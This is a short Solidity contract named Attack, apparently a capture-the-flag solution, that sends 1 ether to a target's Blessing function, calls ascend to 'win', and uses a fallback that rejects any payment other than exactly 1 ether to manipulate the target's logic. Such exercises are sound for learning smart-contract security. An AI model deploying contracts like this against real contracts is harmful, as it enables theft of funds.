// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface mysticalAngel{
     function Blessing() external payable;
     function ascend() external payable;
}

contract Attack {

    mysticalAngel public angel;

    function setTarget(address _angel) public {
        angel = mysticalAngel(_angel);
    }

    function attack() public payable {
        angel.Blessing{value: 1 ether}();
    }

    function win() public {
        angel.ascend();
    }


    fallback() payable external{
        if (msg.value != 1 ether){
            revert();
        }
    }
}